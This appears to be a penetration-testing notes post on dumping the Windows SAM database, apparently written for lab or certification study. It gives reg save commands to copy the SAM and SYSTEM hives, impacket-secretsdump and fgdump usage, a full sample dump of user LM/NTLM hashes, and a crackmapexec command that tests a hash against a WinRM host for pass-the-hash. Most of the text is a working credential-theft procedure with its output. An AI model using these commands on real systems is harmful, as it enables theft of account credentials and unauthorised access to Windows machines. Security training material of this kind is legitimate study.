---
description: >-
  Dumping SAM
title: Dumping SAM              # Add title here
date: 2022-12-16 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Persistence]          # Change Templates to Writeup
tags: [active directory, persistence, sam, dump, fgdump, impacket-secretsdump]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Traditional dumping

In order to dump the same, two register keys must be retrieved:
```powershell
reg save hklm\sam c:\sam 
reg save hklm\system c:\system
```

You need to use impacket-secretsdump to retrieve hashes correctly (samdump2 is not useful here):

```powershell
impacket-secretsdump -system system -sam sam LOCAL
```

### fgdump.exe

Another way to extract the hashes (useful for older Windows versions) is fgdump executable, we only need to upload it to the server and run it, then upon succed a file will be generated:

```powershell
fgdump.exe

type 127.0.0.1.pwdump
admin:1007:A46139FEAAF2B9F117306D272A9441BB:C5E0002FDE3F5EB2CF5730FFEE58EBCC:::
Administrator:500:7BFD3EE62CBB0EBA886450C5D6C50F12:F3ACBE7EC27AADBE8DEEAA0C651A64AF:::
backup:1006:16AC416C2658E00DAAD3B435B51404EE:938DF8B296DD15D0DCE8EAA37BE593E0:::
david:1009:43AF16FFF22F1628AAD3B435B51404EE:1FBFF38CAE51E9918DA1FEC572F03E11:::
gary:1013:998D9DC042886317C72BEFE227197AE1:BA359FA9D25791C2180E424BB7BB0753:::
Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
homer:1017:EF91A6D3CF901B8BAAD3B435B51404EE:B184D292A82B6AD35C3CFCA81F1F59BC:::
IUSR_SRV2:1020:F7D96EBCBE5B6BE3103CCB00190F6271:09FF503707453D56BB69F40BEF542DA0:::
IWAM_SRV2:1019:96FE1FC02D73A84C463DB170B09126F1:BE6EC26D0D71A533E14B65CE755D7BCE:::
john:1010:E52CAC67419A9A2238F10713B629B565:5835048CE94AD0564E29A924A03510EF:::
lee:1015:B096847EAD9B7476AAD3B435B51404EE:208ADB08381ADAB3032EEDBD35399642:::
lisa:1011:A179639DCAF4E1C4AAD3B435B51404EE:8ACF28FDC0168E003FB3E05BCB463D1B:::
mark:1012:6C3D4C343F999422AAD3B435B51404EE:BCD477BFDB45435A34C6A38403CA4364:::
ned:1016:836EDA0FBC609E6393E28745B8BF4BA6:4F16328129408ED105DEC3A938C266EB:::
nick:1014:59B8B93A9A6477E4AAD3B435B51404EE:EE28AD35A22C752C1A75BE3F9A7E82C9:::
simon:1008:598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF:::
sqlusr:1005:6307AB24156C541AAAD3B435B51404EE:6A370590BD44AC8E65D045254A170AB7:::
todd:1018:9E00B755E79C8CF95533B366E9511E4B:4150133921FE34DD2E777B1CA0361410:::
TsInternetUser:1000:E52CAC67419A9A22F96F275E1115B16F:E22E04519AA757D12F1219C4F31252F4:::
```

Then you can use the hash retrieved by using crackmapexec to check that indeed is a correct hash:

```powershell
crackmapexec winrm 192.168.143.59 -u Administrator -p aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -d offsec.local
```

For further details about how to use this hash on a pass the hash attack please refer to [[Pass The Hash#^093000]]



